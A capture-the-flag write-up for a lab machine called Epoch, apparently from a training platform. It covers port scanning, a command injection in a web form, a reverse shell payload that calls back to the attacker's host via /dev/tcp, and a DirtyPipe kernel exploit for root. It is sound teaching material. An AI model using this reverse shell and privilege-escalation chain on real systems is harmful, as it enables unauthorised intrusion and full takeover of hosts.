<h1>writeup-Epoch</h1>
<img src="./img/logo.png" alt="logo" width="700">
<blockquote><h3>
    The room description suggests tha there is a vulnerable WebApplication, So let's start the machine and check out the WebApplication.
    The room also suggests Command Injection so maybe that's the vulnerability in the WebApplication.
</h3></blockquote>
<br>

<ol>
    <li>
        <h2>Reconnaissance</h2>
        <ul>
            <li>
                <h3>Port Scanning</h3>
                <ul>
                    Rustscan result :
                    <ul>
                        <code>Open 10.10.215.48:22 - ssh</code><br>
                        <code>Open 10.10.215.48:80 - http</code>
                    </ul>
                </ul>
            </li>
            <li>
                <h3>SSH</h3>
                <ul><code>
                    OpenSSH 8.2p1 Ubuntu 4ubuntu0.4
                </code></ul>
            </li>
            <li>
                <h3>WebPage</h3>
                <ul>
                    <img src="./img/webPage.png" alt="webPage" width="500"><br>
                </ul>
            </li>
        </ul>
    </li><br>
    <li>
        <h2>Foothold</h2>
        <ul>
            <li>
                <h3>SSH</h3>
                <ul>Brute forcing ssh with hydra will definitely fail and it's not the main objective 
                    of this room so let's move on to the WebApplication.</ul>
            </li>
            <li>
                <h3>WebApplication</h3>
                <ul>
                    We will start with Command Injection because the room description suggests that.
                    Let's try some command injection tricks from <a href="https://book.hacktricks.xyz/pentesting-web/command-injection">hacktricks</a>. <br>
                    <img src="./img/webPage2.png" alt="webPage2" width="500"><br>
                    Now that we know command injection works, let's get a shell.
                    <ul>
                        <li>Step 1:
                            <ul>
                                Start a nc listener.<br>
                                <code>nc -lvnp 1234</code>
                            </ul>
                        </li>
                        <li>Step 2:
                            <ul>
                                Enter your reverse shell command in the input field with command injection vulnerability and click on <code>Convert</code> button.<br>
                                <code>|| sh -i >& /dev/tcp/YourIP/1234 0>&1</code>
                                You got a reverse shell.
                            </ul>
                        </li>
                    </ul>
                    <h2>
                        You can find your flag using <code>env</code>.
                    </h2>
                </ul>
            </li>
        </ul>
    </li>
    <li>
        <h2>Root</h2>
        <ul>
            <li>
                <h3>Things i tried and didn't work :</h3>
                <ol>
                    <li>
                        <code>sudo -l</code>
                        <ul>
                            <code>sh: 2: sudo: not found</code>
                        </ul>
                    </li>
                    <li>
                        <code>find / -type f -perm -04000 2>/dev/null</code>
                        <ul>Nothing intresting here</ul>
                    </li>
                    <li>
                        crontab
                        <ul>
                            <code>No such file or directory</code>
                        </ul>
                    </li>
                </ol>
            </li>
            <li>
                <h3>Thing that did work :</h3>
                <ul>
                    <code>uname -a</code> will show you that this machine is running on <code>linux kernel version 5</code> which might be vulnerable to <code>DirtyPipe</code>.
                    So heres how we will exploit that.
                    <li>
                        Step 1:
                        <ul>Download <a href="https://www.exploit-db.com/exploits/50808">DirtyPipe</a> exploit code on your local machine.</ul>
                    </li>
                    <li>
                        Step 2:
                        <ul>Start python server on your machine and download the exploit on target machine in <code>/tmp</code> directory.</ul>
                    </li>
                    <li>
                        step 3:
                        <ul>
                            compile and execute the executable using <code>gcc</code>.
                        </ul>
                    </li>
                </ul>
                <img src="./img/root.png" alt="root" width="500">
            </li>
        </ul>
    </li><br>
</ol>